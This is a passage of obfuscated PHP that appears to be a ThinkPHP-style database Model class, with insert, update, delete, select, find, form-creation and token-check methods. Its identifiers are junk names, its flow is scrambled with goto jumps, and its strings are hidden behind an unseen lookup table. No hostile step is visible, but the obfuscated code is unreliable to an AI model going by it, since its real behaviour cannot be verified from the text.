$EÊ¯ã±µ¸Ñ[95] . $this->name), $this->fields); } goto EÜ“¯ùõ·†; DÈŠÅ´ßë: if (!$D±å­£×³‰) { return !1; } $this->fields = array_keys($D±å­£×³‰); $this->fields[$EÊ¯ã±µ¸Ñ[248]] = !1; goto b¢ŞÈš•–é; EÜ“¯ùõ·†: } public function switchModel($Cì’Ã•Á”‘, $a©¤»ÁÚ…é = array()) { $f©›“ˆ½ïù =& $_SERVER[›èö’ù¤]; $DˆÃÍª´Áİ = ucwords(strtolower($Cì’Ã•Á”‘)) . $f©›“ˆ½ïù[251]; if (!class_exists($DˆÃÍª´Áİ)) { think_exception($DˆÃÍª´Áİ . think_lang($f©›“ˆ½ïù[252])); } $this->_extModel = new $DˆÃÍª´Áİ($this->name); if (!empty($a©¤»ÁÚ…é)) { foreach ($a©¤»ÁÚ…é as $B‰›å»ôù‚) { $this->_extModel->setProperty($B‰›å»ôù‚, $this->{$B‰›å»ôù‚}); } } return $this->_extModel; } public function __set($fÃ«›†ªõ, $fª§Óö„‹‹) { $this->data[$fÃ«›†ªõ] = $fª§Óö„‹‹; } public function __get($d‘’Ş›õ„) { return isset($this->data[$d‘’Ş›õ„]) ? $this->data[$d‘’Ş›õ„] : null; } public function __isset($a¾†Ìî›Ë›) { return isset($this->data[$a¾†Ìî›Ë›]); } public function __unset($DÈ‹»Ê——Š) { unset($this->data[$DÈ‹»Ê——Š]); } public function __call($b™‘Ì¡Ã”Ä, $BÔÏŒ ¢Ü•) { $F´£“šİ´ =& $_SERVER[›èö’ù¤]; if (in_array(strtolower($b™‘Ì¡Ã”Ä), $this->methods, !0)) { $this->options[strtolower($b™‘Ì¡Ã”Ä)] = $BÔÏŒ ¢Ü•[0]; return $this; } elseif (in_array(strtolower($b™‘Ì¡Ã”Ä), array($F´£“šİ´[253], $F´£“šİ´[254], $F´£“šİ´[255], $F´£“šİ´[256], $F´£“šİ´[257]), !0)) { $e‹Å©Úâèõ = isset($BÔÏŒ ¢Ü•[0]) ? $BÔÏŒ ¢Ü•[0] : $F´£“šİ´[182]; $e‹Å©Úâèõ = $this->db->parseKey($e‹Å©Úâèõ); return $this->getField(strtoupper($b™‘Ì¡Ã”Ä) . $F´£“šİ´[258] . $e‹Å©Úâèõ . $F´£“šİ´[259] . $b™‘Ì¡Ã”Ä, $F´£“šİ´[253]); } elseif (strtolower(substr($b™‘Ì¡Ã”Ä, 0, 5)) == $F´£“šİ´[260]) { $e‹Å©Úâèõ = think_parse_name(substr($b™‘Ì¡Ã”Ä, 5)); $CÌØ¾£âñ¹[$e‹Å©Úâèõ] = $BÔÏŒ ¢Ü•[0]; return $this->where($CÌØ¾£âñ¹)->find(); } elseif (strtolower(substr($b™‘Ì¡Ã”Ä, 0, 10)) == $F´£“šİ´[261]) { $c‡åº¡¨ï = think_parse_name(substr($b™‘Ì¡Ã”Ä, 10)); $CÌØ¾£âñ¹[$c‡åº¡¨ï] = $BÔÏŒ ¢Ü•[0]; return $this->where($CÌØ¾£âñ¹)->getField($BÔÏŒ ¢Ü•[1]); } elseif (isset($this->_scope[$b™‘Ì¡Ã”Ä])) { return $this->scope($b™‘Ì¡Ã”Ä, $BÔÏŒ ¢Ü•[0]); } elseif (method_exists($this, $b™‘Ì¡Ã”Ä)) { array_unshift($BÔÏŒ ¢Ü•, $b™‘Ì¡Ã”Ä); return call_user_func_array(array($this, $F´£“šİ´[262]), $BÔÏŒ ¢Ü•); } else { return call_user_func_array(array(parent, $b™‘Ì¡Ã”Ä), $BÔÏŒ ¢Ü•); } } protected function call() { goto DŸ¶—ƒ‘®É; Bº„»Íåâ¡: $e£ˆƒ™Íëø = $c“²ƒÕ¯È; if (is_array($c“²ƒÕ¯È)) { $e£ˆƒ™Íëø = $c“²ƒÕ¯È[1]; $c“²ƒÕ¯È = $c“²ƒÕ¯È[0]; } $fÈª£Êšïœ = count($c”ÓßĞ“Ñì) - 1; goto DæöÄ”£ÊŒ; DŸ¶—ƒ‘®É: $EÆ·Çß¢Æá =& $_SERVER[›èö’ù¤]; $c”ÓßĞ“Ñì = func_get_args(); $c“²ƒÕ¯È = array_shift($c”ÓßĞ“Ñì); goto Bº„»Íåâ¡; D‘çÜ£ä²Ñ: $a—ô½ŞÌ¨ = call_user_func_array(array($this, $c“²ƒÕ¯È), $c”ÓßĞ“Ñì); if (method_exists($this, $EÆ·Çß¢Æá[266])) { $dÖÕ‘‡…™÷ = call_user_func_array(array($this, $EÆ·Çß¢Æá[267]), array($e£ˆƒ™Íëø, $c”ÓßĞ“Ñì, $a—ô½ŞÌ¨)); if ($dÖÕ‘‡…™÷) { return $dÖÕ‘‡…™÷; } } return $a—ô½ŞÌ¨; goto cßƒÄĞÀ¨¾; DæöÄ”£ÊŒ: if (isset($c”ÓßĞ“Ñì[$fÈª£Êšïœ]) && $c”ÓßĞ“Ñì[$fÈª£Êšïœ] === $c“²ƒÕ¯È) { think_exception(__CLASS__ . $EÆ·Çß¢Æá[4] . $c“²ƒÕ¯È . think_lang($EÆ·Çß¢Æá[263])); return; } $c”ÓßĞ“Ñì[] = $c“²ƒÕ¯È; if (method_exists($this, $EÆ·Çß¢Æá[264])) { $dÖÕ‘‡…™÷ = call_user_func_array(array($this, $EÆ·Çß¢Æá[265]), array($e£ˆƒ™Íëø, $c”ÓßĞ“Ñì)); if (!is_null($dÖÕ‘‡…™÷) && $dÖÕ‘‡…™÷ !== !1) { return $dÖÕ‘‡…™÷; } } goto D‘çÜ£ä²Ñ; cßƒÄĞÀ¨¾: } protected function _initialize() { } protected function _facade($BÆ¯—Š¼ùø) { $dêÇ˜Õãé¸ =& $_SERVER[›èö’ù¤]; if (!empty($this->fields)) { foreach ($BÆ¯—Š¼ùø as $d«Ñ®ñíÚà => $A©ïêíŒïİ) { if (is_array($this->fields) && !in_array($d«Ñ®ñíÚà, $this->fields, !0)) { unset($BÆ¯—Š¼ùø[$d«Ñ®ñíÚà]); } elseif (is_scalar($A©ïêíŒïİ)) { $this->_parseType($BÆ¯—Š¼ùø, $d«Ñ®ñíÚà); } } } if (!empty($this->options[$dêÇ˜Õãé¸[268]])) { $BÆ¯—Š¼ùø = array_map($this->options[$dêÇ˜Õãé¸[268]], $BÆ¯—Š¼ùø); unset($this->options[$dêÇ˜Õãé¸[268]]); } $this->_beforeWrite($BÆ¯—Š¼ùø); return $BÆ¯—Š¼ùø; } protected function _beforeWrite(&$d‘íÆ°ç‘ò) { } public function add($aóÎÃõÅ ˜ = '', $EéÔß¹Ç´è = array(), $bêŞéè“†Ê = false) { goto a–Í‚¼ä¹; EõÉèÃµ°: return $E½™“ù‡í¨; goto CŸòª‘áÌ·; bˆâ¾öè’Å: if (!1 === $this->_beforeInsert($aóÎÃõÅ ˜, $EéÔß¹Ç´è)) { return !1; } $E½™“ù‡í¨ = $this->db->insert($aóÎÃõÅ ˜, $EéÔß¹Ç´è, $bêŞéè“†Ê); if (!1 !== $E½™“ù‡í¨) { $d…åÈô¸Ò = $this->getLastInsID(); if ($d…åÈô¸Ò) { $aóÎÃõÅ ˜[$this->getPk()] = $d…åÈô¸Ò; $this->_after_insert($aóÎÃõÅ ˜, $EéÔß¹Ç´è); return $d…åÈô¸Ò; } $this->_after_insert($aóÎÃõÅ ˜, $EéÔß¹Ç´è); } goto EõÉèÃµ°; a–Í‚¼ä¹: if (empty($aóÎÃõÅ ˜)) { if (!empty($this->data)) { $aóÎÃõÅ ˜ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[›èö’ù¤][269]); return !1; } } $EéÔß¹Ç´è = $this->_parseOptions($EéÔß¹Ç´è); $aóÎÃõÅ ˜ = $this->_facade($aóÎÃõÅ ˜); goto bˆâ¾öè’Å; CŸòª‘áÌ·: } protected function _beforeInsert(&$CÚ›«ñ´ğ¡, $D„âÔ™ù¢Ø) { } protected function _after_insert($CÇ¯ƒ…”, $dĞ¬´ÏÜóÍ) { } public function addAll($f¯Ø‘ÎÕÄ, $eÚ´Š„ÉËÒ = array(), $Dù‰ÔŒËõ› = false) { goto có°¨±ªï; e¶ÏÃé †Æ: return $E–‹ø–¾„ù; goto e­œàòÖêñ; có°¨±ªï: $dã™Æ³ÔÉ· =& $_SERVER[›èö’ù¤]; if (empty($f¯Ø‘ÎÕÄ)) { $this->error = think_lang($dã™Æ³ÔÉ·[269]); return !1; } $eÚ´Š„ÉËÒ = $this->_parseOptions($eÚ´Š„ÉËÒ); goto aÊ¼’Ñ­É; aÊ¼’Ñ­É: foreach ($f¯Ø‘ÎÕÄ as $c•­ø‰ª˜ => $dğó¦İôê„) { $f¯Ø‘ÎÕÄ[$c•­ø‰ª˜] = $this->_facade($dğó¦İôê„); } if (method_exists($this->db, $dã™Æ³ÔÉ·[270])) { $E–‹ø–¾„ù = $this->db->insertAll($f¯Ø‘ÎÕÄ, $eÚ´Š„ÉËÒ, $Dù‰ÔŒËõ›); } else { $this->startTrans(); foreach ($f¯Ø‘ÎÕÄ as $c•­ø‰ª˜ => $dğó¦İôê„) { $E–‹ø–¾„ù = $this->db->insert($dğó¦İôê„, $eÚ´Š„ÉËÒ, $Dù‰ÔŒËõ›); } $this->commit(); } if (!1 !== $E–‹ø–¾„ù) { $E…Ãæ› …— = $this->getLastInsID(); if ($E…Ãæ› …—) { return $E…Ãæ› …—; } } goto e¶ÏÃé †Æ; e­œàòÖêñ: } public function selectAdd($C™‰‹àŠÀ³ = '', $DçëÅµ• = '', $C¹ß’“Ş = array()) { $E‹˜ƒ¿£‚· =& $_SERVER[›èö’ù¤]; $C¹ß’“Ş = $this->_parseOptions($C¹ß’“Ş); if (!1 === ($BË‘×‰´±ƒ = $this->db->selectInsert($C™‰‹àŠÀ³ ? $C™‰‹àŠÀ³ : $C¹ß’“Ş[$E‹˜ƒ¿£‚·[271]], $DçëÅµ• ? $DçëÅµ• : $this->getTableName(), $C¹ß’“Ş))) { $this->error = think_lang($E‹˜ƒ¿£‚·[272]); return !1; } else { return $BË‘×‰´±ƒ; } } public function save($cøĞŠÍ²‚ = '', $C…‚•¸‚ãÇ = array()) { goto Aä©Â¸Õ»…; Aä©Â¸Õ»…: $EÉ÷…¥Öô =& $_SERVER[›èö’ù¤]; if (empty($cøĞŠÍ²‚)) { if (!empty($this->data)) { $cøĞŠÍ²‚ = $this->data; $this->data = array(); } else { $this->error = think_lang($EÉ÷…¥Öô[269]); return !1; } } $cøĞŠÍ²‚ = $this->_facade($cøĞŠÍ²‚); goto aİ¹×¹Ğ‡‰; døÒÉÇë¢: if (is_array($C…‚•¸‚ãÇ[$EÉ÷…¥Öô[273]]) && isset($C…‚•¸‚ãÇ[$EÉ÷…¥Öô[273]][$E§ĞéŞÜñø])) { $E™‘ª‚÷­ = $C…‚•¸‚ãÇ[$EÉ÷…¥Öô[273]][$E§ĞéŞÜñø]; } if (!1 === $this->_beforeUpdate($cøĞŠÍ²‚, $C…‚•¸‚ãÇ)) { return !1; } $a‰½×î«à¿ = $this->db->update($cøĞŠÍ²‚, $C…‚•¸‚ãÇ); goto CêÔµˆÀğÔ; CêÔµˆÀğÔ: if (!1 !== $a‰½×î«à¿) { if (isset($E™‘ª‚÷­)) { $cøĞŠÍ²‚[$E§ĞéŞÜñø] = $E™‘ª‚÷­; } $this->_afterUpdate($cøĞŠÍ²‚, $C…‚•¸‚ãÇ); } return $a‰½×î«à¿; goto Bô¼ã¹ç²à; aİ¹×¹Ğ‡‰: $C…‚•¸‚ãÇ = $this->_parseOptions($C…‚•¸‚ãÇ); $E§ĞéŞÜñø = $this->getPk(); if (!isset($C…‚•¸‚ãÇ[$EÉ÷…¥Öô[273]])) { if (isset($cøĞŠÍ²‚[$E§ĞéŞÜñø])) { $dñ§É´¸ÎÚ[$E§ĞéŞÜñø] = $cøĞŠÍ²‚[$E§ĞéŞÜñø]; $C…‚•¸‚ãÇ[$EÉ÷…¥Öô[273]] = $dñ§É´¸ÎÚ; unset($cøĞŠÍ²‚[$E§ĞéŞÜñø]); } else { $this->error = think_lang($EÉ÷…¥Öô[272]); return !1; } } goto døÒÉÇë¢; Bô¼ã¹ç²à: } protected function _beforeUpdate(&$fÃ¼ §ğ›, $E‡½ÊŞ×­™) { } protected function _afterUpdate($a¢¾Øö—‹, $aî ³…Á¹ç) { } public function delete($bäĞ–ìù = array()) { goto C„…˜»éÂÒ; Bƒé…Æ…Ù: if (is_numeric($bäĞ–ìù) || is_string($bäĞ–ìù)) { if (strpos($bäĞ–ìù, $AêÃí«°ïö[47])) { $Bæ‚ÜÆƒÚ[$d½÷óßŠô½] = array($AêÃí«°ïö[274], $bäĞ–ìù); } else { $Bæ‚ÜÆƒÚ[$d½÷óßŠô½] = $bäĞ–ìù; } $this->options[$AêÃí«°ïö[273]] = $Bæ‚ÜÆƒÚ; } $bäĞ–ìù = $this->_parseOptions(); if (is_array($bäĞ–ìù[$AêÃí«°ïö[273]]) && isset($bäĞ–ìù[$AêÃí«°ïö[273]][$d½÷óßŠô½])) { $fäİ‚˜ÙñŠ = $bäĞ–ìù[$AêÃí«°ïö[273]][$d½÷óßŠô½]; } goto DÕìéÈôÍ; C„…˜»éÂÒ: $AêÃí«°ïö =& $_SERVER[›èö’ù¤]; if (empty($bäĞ–ìù) && empty($this->options[$AêÃí«°ïö[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $d½÷óßŠô½ = $this->getPk(); goto Bƒé…Æ…Ù; DÕìéÈôÍ: $aÄˆµÀ•Ö× = $this->db->delete($bäĞ–ìù); if (!1 !== $aÄˆµÀ•Ö×) { $dó¢ßÛç´ë = array(); if (isset($fäİ‚˜ÙñŠ)) { $dó¢ßÛç´ë[$d½÷óßŠô½] = $fäİ‚˜ÙñŠ; } $this->_after_delete($dó¢ßÛç´ë, $bäĞ–ìù); } return $aÄˆµÀ•Ö×; goto aÇÆ‚ËŞŞœ; aÇÆ‚ËŞŞœ: } protected function _after_delete($FŒ›ˆøİ½, $dÎğ—ˆ–óè) { } public function select($CÇ¢Ğôƒİ = array()) { goto AØ²ê®ó¶; F›ÎšÒİá: $cô‹¾ ì™ = $this->db->select($CÇ¢Ğôƒİ); if (!1 === $cô‹¾ ì™) { return !1; } if (empty($cô‹¾ ì™)) { return null; } goto F«Ê†ŠÆ³œ; F«Ê†ŠÆ³œ: $this->_afterSelect($cô‹¾ ì™, $CÇ¢Ğôƒİ); return $cô‹¾ ì™; goto eÒõÚÏí«å; AØ²ê®ó¶: $Fƒá¼ĞÔÌ… =& $_SERVER[›èö’ù¤]; if (is_string($CÇ¢Ğôƒİ) || is_numeric($CÇ¢Ğôƒİ)) { $fƒœ¼Æ›á = $this->getPk(); if (strpos($CÇ¢Ğôƒİ, $Fƒá¼ĞÔÌ…[47])) { $EĞÆì’·ˆ[$fƒœ¼Æ›á] = array($Fƒá¼ĞÔÌ…[274], $CÇ¢Ğôƒİ); } else { $EĞÆì’·ˆ[$fƒœ¼Æ›á] = $CÇ¢Ğôƒİ; } $this->options[$Fƒá¼ĞÔÌ…[273]] = $EĞÆì’·ˆ; } elseif (!1 === $CÇ¢Ğôƒİ) { $CÇ¢Ğôƒİ = $this->_parseOptions(); return $Fƒá¼ĞÔÌ…[275] . $this->db->buildSelectSql($CÇ¢Ğôƒİ) . $Fƒá¼ĞÔÌ…[276]; } $CÇ¢Ğôƒİ = $this->_parseOptions(); goto F›ÎšÒİá; eÒõÚÏí«å: } protected function _afterSelect(&$E›ŞŠÑ°ø”, $cÁÙ„èĞÄà) { } public function buildSql($F‚¾ìº“«ã = array()) { $a¨ĞøÙîÚŞ =& $_SERVER[›èö’ù¤]; $F‚¾ìº“«ã = $this->_parseOptions($F‚¾ìº“«ã); return $a¨ĞøÙîÚŞ[275] . $this->db->buildSelectSql($F‚¾ìº“«ã) . $a¨ĞøÙîÚŞ[276]; } public function optionsValue($d®ÖÇŠàù¡ = null) { if (is_null($d®ÖÇŠàù¡)) { return $this->options; } elseif (is_array($d®ÖÇŠàù¡)) { $this->options = array_merge($this->options, $d®ÖÇŠàù¡); } } protected function _parseOptions($bŠ‡êÅª = array()) { goto d¦ØÁ Ì½õ; fÙôÌ…Üæå: if (isset($bŠ‡êÅª[$D¼ˆÄÙƒğª[273]]) && is_array($bŠ‡êÅª[$D¼ˆÄÙƒğª[273]]) && !empty($fÅ£Ò”²í) && !isset($bŠ‡êÅª[$D¼ˆÄÙƒğª[280]]) && !isset($bŠ‡êÅª[$D¼ˆÄÙƒğª[277]])) { foreach ($bŠ‡êÅª[$D¼ˆÄÙƒğª[273]] as $Bè‹‹–µ±” => $CÍô›¼±âÆ) { $Bè‹‹–µ±” = trim($Bè‹‹–µ±”); if (in_array($Bè‹‹–µ±”, $fÅ£Ò”²í, !0)) { if (is_scalar($CÍô›¼±âÆ)) { $this->_parseType($bŠ‡êÅª[$D¼ˆÄÙƒğª[273]], $Bè‹‹–µ±”); } } elseif (!is_numeric($Bè‹‹–µ±”) && $D¼ˆÄÙƒğª[71] != substr($Bè‹‹–µ±”, 0, 1) && !1 === strpos($Bè‹‹–µ±”, $D¼ˆÄÙƒğª[95]) && !1 === strpos($Bè‹‹–µ±”, $D¼ˆÄÙƒğª[258]) && !1 === strpos($Bè‹‹–µ±”, $D¼ˆÄÙƒğª[281]) && !1 === strpos($Bè‹‹–µ±”, $D¼ˆÄÙƒğª[282])) { unset($bŠ‡êÅª[$D¼ˆÄÙƒğª[273]][$Bè‹‹–µ±”]); } } } $this->_options_filter($bŠ‡êÅª); return $bŠ‡êÅª; goto Aö”ÙŞ„; d¦ØÁ Ì½õ: $D¼ˆÄÙƒğª =& $_SERVER[›èö’ù¤]; if (is_array($bŠ‡êÅª)) { $bŠ‡êÅª = array_merge($this->options, $bŠ‡êÅª); } $this->options = array(); goto b«Ò™Ÿòù¡; b«Ò™Ÿòù¡: if (!isset($bŠ‡êÅª[$D¼ˆÄÙƒğª[277]])) { $bŠ‡êÅª[$D¼ˆÄÙƒğª[277]] = $this->getTableName(); $fÅ£Ò”²í = $this->fields; } else { $fÅ£Ò”²í = $this->getDbFields(); } if (!empty($bŠ‡êÅª[$D¼ˆÄÙƒğª[278]])) { $bŠ‡êÅª[$D¼ˆÄÙƒğª[277]] .= $D¼ˆÄÙƒğª[50] . $bŠ‡êÅª[$D¼ˆÄÙƒğª[278]]; } $bŠ‡êÅª[$D¼ˆÄÙƒğª[279]] = $this->name; goto fÙôÌ…Üæå; Aö”ÙŞ„: } protected function _options_filter(&$b³®–£½À) { } protected function _parseType(&$bê†ñè•Œå, $DÓ¦¾‡–Ì) { $A‘ÜË÷¼ =& $_SERVER[›èö’ù¤]; if (empty($this->options[$A‘ÜË÷¼[283]][$A‘ÜË÷¼[4] . $DÓ¦¾‡–Ì])) { $A¢–îĞï„Œ = strtolower($this->fields[$A‘ÜË÷¼[250]][$DÓ¦¾‡–Ì]); if (!1 !== strpos($A¢–îĞï„Œ, $A‘ÜË÷¼[284])) { } elseif (!1 === strpos($A¢–îĞï„Œ, $A‘ÜË÷¼[285]) && !1 !== strpos($A¢–îĞï„Œ, $A‘ÜË÷¼[286])) { $bê†ñè•Œå[$DÓ¦¾‡–Ì] = intval($bê†ñè•Œå[$DÓ¦¾‡–Ì]); } elseif (!1 !== strpos($A¢–îĞï„Œ, $A‘ÜË÷¼[287]) || !1 !== strpos($A¢–îĞï„Œ, $A‘ÜË÷¼[288])) { $bê†ñè•Œå[$DÓ¦¾‡–Ì] = floatval($bê†ñè•Œå[$DÓ¦¾‡–Ì]); } elseif (!1 !== strpos($A¢–îĞï„Œ, $A‘ÜË÷¼[289])) { $bê†ñè•Œå[$DÓ¦¾‡–Ì] = (bool) $bê†ñè•Œå[$DÓ¦¾‡–Ì]; } } } public function find($D·†‡„ø = array()) { goto EŒƒ¦Š£á; EŒƒ¦Š£á: $BŒİÕ½‡÷á =& $_SERVER[›èö’ù¤]; if (is_numeric($D·†‡„ø) || is_string($D·†‡„ø)) { $b©ŒÈˆ‚õí[$this->getPk()] = intval($D·†‡„ø); $this->options[$BŒİÕ½‡÷á[273]] = $b©ŒÈˆ‚õí; } $this->options[$BŒİÕ½‡÷á[290]] = 1; goto fÍÅ†¬ğ„š; fÍÅ†¬ğ„š: $D·†‡„ø = $this->_parseOptions(); $CœŞø†¶°® = $this->db->select($D·†‡„ø); if (!1 === $CœŞø†¶°®) { return !1; } goto Añº„£‰‚è; Cêˆù“›Šõ: if (!empty($this->options[$BŒİÕ½‡÷á[291]])) { return $this->returnResult($this->data, $this->options[$BŒİÕ½‡÷á[291]]); } return $this->data; goto D²’Í¹¤½õ; Añº„£‰‚è: if (empty($CœŞø†¶°®)) { return null; } $this->data = $CœŞø†¶°®[0]; $this->_afterFind($this->data, $D·†‡„ø); goto Cêˆù“›Šõ; D²’Í¹¤½õ: } protected function _afterFind(&$eÏÑª™âë, $fÄ…êàĞ”ñ) { } protected function returnResult($f¬ê¬‰İ¡‘, $bØÊÃ´‚ˆÆ = '') { $cèÅŞ¸ÕÚ¬ =& $_SERVER[›èö’ù¤]; if ($bØÊÃ´‚ˆÆ) { if (is_callable($bØÊÃ´‚ˆÆ)) { return call_user_func($bØÊÃ´‚ˆÆ, $f¬ê¬‰İ¡‘); } switch (strtolower($bØÊÃ´‚ˆÆ)) { case $cèÅŞ¸ÕÚ¬[292]: return json_encode($f¬ê¬‰İ¡‘); case $cèÅŞ¸ÕÚ¬[293]: return xml_encode($f¬ê¬‰İ¡‘); } } return $f¬ê¬‰İ¡‘; } public function parseFieldsMap($aÇ©Æ¹Ş¼¹, $bÀ·âĞÔË = 1) { if (!empty($this->_map)) { foreach ($this->_map as $fÕÉåÍÎİÔ => $EåÈ´¤Š¦) { if ($bÀ·âĞÔË == 1) { if (isset($aÇ©Æ¹Ş¼¹[$EåÈ´¤Š¦])) { $aÇ©Æ¹Ş¼¹[$fÕÉåÍÎİÔ] = $aÇ©Æ¹Ş¼¹[$EåÈ´¤Š¦]; unset($aÇ©Æ¹Ş¼¹[$EåÈ´¤Š¦]); } } else { if (isset($aÇ©Æ¹Ş¼¹[$fÕÉåÍÎİÔ])) { $aÇ©Æ¹Ş¼¹[$EåÈ´¤Š¦] = $aÇ©Æ¹Ş¼¹[$fÕÉåÍÎİÔ]; unset($aÇ©Æ¹Ş¼¹[$fÕÉåÍÎİÔ]); } } } } return $aÇ©Æ¹Ş¼¹; } public function setField($Dø©µ ˜„®, $dØ“¢Æ Ù› = '') { if (is_array($Dø©µ ˜„®)) { $EÜùì÷İ = $Dø©µ ˜„®; } else { $EÜùì÷İ[$Dø©µ ˜„®] = $dØ“¢Æ Ù›; } return $this->save($EÜùì÷İ); } public function setAdd($e‡æÑ¯ä•, $e¤î‘‘ÁîÂ = 1) { $Bè“¥òÊ†¨ =& $_SERVER[›èö’ù¤]; $C¸ğ³¶©Ä’ = $e‡æÑ¯ä• . $Bè“¥òÊ†¨[294] . $e¤î‘‘ÁîÂ; if ($e¤î‘‘ÁîÂ < 0) { $C¸ğ³¶©Ä’ = $e‡æÑ¯ä• . $e¤î‘‘ÁîÂ; } return $this->setField($e‡æÑ¯ä•, array($Bè“¥òÊ†¨[295], $C¸ğ³¶©Ä’)); } public function getField($E„êÜÜõ“, $BÈõÖÖ—Í = null) { $FùÈ„Æš„Á =& $_SERVER[›èö’ù¤]; $c ËğæŞï[$FùÈ„Æš„Á[271]] = $E„êÜÜõ“; $c ËğæŞï = $this->_parseOptions($c ËğæŞï); $E„êÜÜõ“ = trim($E„êÜÜõ“); if (strpos($E„êÜÜõ“, $FùÈ„Æš„Á[47])) { if (!isset($c ËğæŞï[$FùÈ„Æš„Á[290]])) { $c ËğæŞï[$FùÈ„Æš„Á[290]] = is_numeric($BÈõÖÖ—Í) ? $BÈõÖÖ—Í : $FùÈ„Æš„Á[33]; } $A£„Ë«°è = $this->db->select($c ËğæŞï); if (!empty($A£„Ë«°è)) { goto DÉ‡ŞÁƒË; cµÍÒå†Œƒ: $F…Ÿ»›Ï›£ = array_shift($E„êÜÜõ“); $DºˆâÓÇé = array(); $BàêáãÜ×¯ = count($F‡‰öÕÍî); goto D°¶È—ˆì™; D°¶È—ˆì™: foreach ($A£„Ë«°è as $aØÕ‡‘©ç§) { $CÉŒÀéÁ®ï = $aØÕ‡‘©ç§[$bˆˆ›ğí¡ê]; if (2 == $BàêáãÜ×¯) { $DºˆâÓÇé[$CÉŒÀéÁ®ï] = $aØÕ‡‘©ç§[$F…Ÿ»›Ï›£]; } else { $DºˆâÓÇé[$CÉŒÀéÁ®ï] = is_string($BÈõÖÖ—Í) ? implode($BÈõÖÖ—Í, $aØÕ‡‘©ç§) : $aØÕ‡‘©ç§; } } return $DºˆâÓÇé; goto AŞÖà Óè½; DÉ‡ŞÁƒË: $F‡‰öÕÍî = explode($FùÈ„Æš„Á[47], $E„êÜÜõ“); $E„êÜÜõ“ = array_keys($A£„Ë«°è[0]); $bˆˆ›ğí¡ê = array_shift($E„êÜÜõ“); goto cµÍÒå†Œƒ; AŞÖà Óè½: } } else { if (!0 !== $BÈõÖÖ—Í) { $c ËğæŞï[$FùÈ„Æš„Á[290]] = is_numeric($BÈõÖÖ—Í) ? $BÈõÖÖ—Í : 1; } if ($BÈõÖÖ—Í === $FùÈ„Æš„Á[253]) { unset($c ËğæŞï[$FùÈ„Æš„Á[290]]); } $aØÕ‡‘©ç§ = $this->db->select($c ËğæŞï); if (!empty($aØÕ‡‘©ç§)) { if ($BÈõÖÖ—Í === $FùÈ„Æš„Á[253]) { return reset($aØÕ‡‘©ç§[0]); } if (!0 !== $BÈõÖÖ—Í && 1 == $c ËğæŞï[$FùÈ„Æš„Á[290]]) { return reset($aØÕ‡‘©ç§[0]); } foreach ($aØÕ‡‘©ç§ as $B†ªè¬Åˆ«) { $e‹èĞöì§‹[] = $B†ªè¬Åˆ«[$E„êÜÜõ“]; } return $e‹èĞöì§‹; } } return null; } public function create($F‰òÛì‚ = '', $aˆÉ‘Ä®Ø = '') { goto eÑ÷Í­¥Ü; eÑ÷Í­¥Ü: $Bñ¿ê­¸æƒ =& $_SERVER[›èö’ù¤]; if (empty($F‰òÛì‚)) { $F‰òÛì‚ = $_POST; } elseif (is_object($F‰òÛì‚)) { $F‰òÛì‚ = get_object_vars($F‰òÛì‚); } if (empty($F‰òÛì‚) || !is_array($F‰òÛì‚)) { $this->error = think_lang($Bñ¿ê­¸æƒ[269]); return !1; } goto F­¨‚ŠĞ®ª; Cõ®×°ÍÔ·: if (isset($C¨³ëÄÎÛ”)) { if (is_string($C¨³ëÄÎÛ”)) { $C¨³ëÄÎÛ” = explode($Bñ¿ê­¸æƒ[47], $C¨³ëÄÎÛ”); } if (think_config($Bñ¿ê­¸æƒ[296])) { $C¨³ëÄÎÛ”[] = think_config($Bñ¿ê­¸æƒ[297]); } foreach ($F‰òÛì‚ as $AÉëÊö°’ => $AƒÅğé¡§ã) { if (!in_array($AÉëÊö°’, $C¨³ëÄÎÛ”)) { unset($F‰òÛì‚[$AÉëÊö°’]); } } } if (!$this->autoValidation($F‰òÛì‚, $aˆÉ‘Ä®Ø)) { return !1; } if (!$this->autoCheckToken($F‰òÛì‚)) { $this->error = think_lang($Bñ¿ê­¸æƒ[298]); return !1; } goto DŞËº»Ç‰¥; b«Ì®¶Ë“ì: return $F‰òÛì‚; goto aÌÍÖ‚¶Ğ; DŞËº»Ç‰¥: if ($this->autoCheckFields) { $C¨³ëÄÎÛ” = $this->getDbFields(); foreach ($F‰òÛì‚ as $AÉëÊö°’ => $AƒÅğé¡§ã) { if (!in_array($AÉëÊö°’, $C¨³ëÄÎÛ”)) { unset($F‰òÛì‚[$AÉëÊö°’]); } elseif (MAGIC_QUOTES_GPC && is_string($AƒÅğé¡§ã)) { $F‰òÛì‚[$AÉëÊö°’] = stripslashes($AƒÅğé¡§ã); } } } $this->autoOperation($F‰òÛì‚, $aˆÉ‘Ä®Ø); $this->data = $F‰òÛì‚; goto b«Ì®¶Ë“ì; F­¨‚ŠĞ®ª: $F‰òÛì‚ = $this->parseFieldsMap($F‰òÛì‚, 0); $aˆÉ‘Ä®Ø = $aˆÉ‘Ä®Ø ? $aˆÉ‘Ä®Ø : (!empty($F‰òÛì‚[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Bñ¿ê­¸æƒ[271]])) { $C¨³ëÄÎÛ” = $this->options[$Bñ¿ê­¸æƒ[271]]; unset($this->options[$Bñ¿ê­¸æƒ[271]]); } elseif ($aˆÉ‘Ä®Ø == THINK_MODEL_INSERT && isset($this->insertFields)) { $C¨³ëÄÎÛ” = $this->insertFields; } elseif ($aˆÉ‘Ä®Ø == THINK_MODEL_UPDATE && isset($this->updateFields)) { $C¨³ëÄÎÛ” = $this->updateFields; } goto Cõ®×°ÍÔ·; aÌÍÖ‚¶Ğ: } public function autoCheckToken($FİàÂ™«¤) { $FƒíêÆ“À =& $_SERVER[›èö’ù¤]; if (isset($this->options[$FƒíêÆ“À[299]]) && !$this->options[$FƒíêÆ“À[299]]) { return !0; } if (think_config($FƒíêÆ“À[296])) { $fóŞ„¬šÇâ = think_config($FƒíêÆ“À[297]); if (!isset($FİàÂ™«¤[$fóŞ„¬šÇâ]) || Session::get($fóŞ„¬šÇâ)) { return !1; } list($döÀ£ÂÇ–·, $D®ÂğÜä) = explode($FƒíêÆ“À[71], $FİàÂ™«¤[$fóŞ„¬šÇâ]); if ($D®ÂğÜä && Session::get($fóŞ„¬šÇâ . $FƒíêÆ“À[95] . $döÀ£ÂÇ–·) === $D®ÂğÜä) { Session::remove($fóŞ„¬šÇâ . $FƒíêÆ“À[95] . $döÀ£ÂÇ–·); return !0; } if (think_config($FƒíêÆ“À[300])) { 